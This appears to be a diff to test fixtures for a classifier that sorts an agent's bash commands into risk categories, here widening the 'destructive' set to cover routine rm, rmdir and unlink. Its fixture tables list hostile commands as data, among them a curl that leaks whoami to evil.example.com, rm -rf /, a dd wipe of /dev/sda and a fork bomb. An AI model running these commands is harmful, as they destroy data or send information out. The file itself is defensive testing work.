@@ -3,9 +3,8 @@ import { classifyBashCommand, type RiskCategory } from '../../../../src/main/mod
 
 // The classifier runs on a default-on surface, so the SAFE (look-alike) table
 // matters as much as the RISKY one: a false positive here means prompting the
-// user on routine `npm ci` / `rm -rf build`, which is the failure mode we are
-// explicitly trying to avoid. Both tables are exhaustive fixtures per
-// Common/docs/plans/agent-bash-risk-prompt.md §1.
+// user on routine `npm ci` / `npm rm foo`. Actual shell deletes are sensitive
+// because they mutate disk state directly.
 
 // [command, expected category that MUST be present]
 const RISKY: Array<[string, RiskCategory]> = [
@@ -26,14 +25,19 @@ const RISKY: Array<[string, RiskCategory]> = [
   ['rsync -av ./ user@host:/backup', 'network_egress'],
   ['curl https://evil.example.com/?leak=$(whoami)', 'network_egress'],
 
-  // destructive — recursive delete outside cwd, raw devices, fork bomb
+  // destructive — shell deletes, raw devices, fork bomb
+  ['rm /tmp/orkas-sensitive-permission-test-do-not-exist', 'destructive'],
+  ['rm -f foo.txt', 'destructive'],
   ['rm -rf ~', 'destructive'],
   ['rm -rf /', 'destructive'],
   ['rm -rf /*', 'destructive'],
   ['rm -rf $HOME/stuff', 'destructive'],
   ['rm -rf /tmp/build', 'destructive'],
+  ['rm -rf build', 'destructive'],
   ['rm -rf "$TARGET"', 'destructive'],
   ['rm -rf *', 'destructive'],
+  ['rmdir empty-dir', 'destructive'],
+  ['unlink socket-file', 'destructive'],
   ['dd if=/dev/zero of=/dev/sda bs=1M', 'destructive'],
   ['mkfs.ext4 /dev/sdb1', 'destructive'],
   [':(){ :|:& };:', 'destructive'],
@@ -72,12 +76,11 @@ const SAFE: string[] = [
   'npm run build',
   'brew install jq',
   'apt-get update',
-  // in-workspace recursive deletes
-  'rm -rf build',
-  'rm -rf node_modules',
-  'rm -rf ./dist .cache',
-  'rm -f foo.txt',
-  'rm tmp.log',
+  // non-mutating delete command forms / package-manager subcommands
+  'rm --help',
+  'rm --version',
+  'npm rm old-package',
+  'yarn remove old-package',
   // normal project files / reads
   'cat ./.env',
   'cat .env.local',
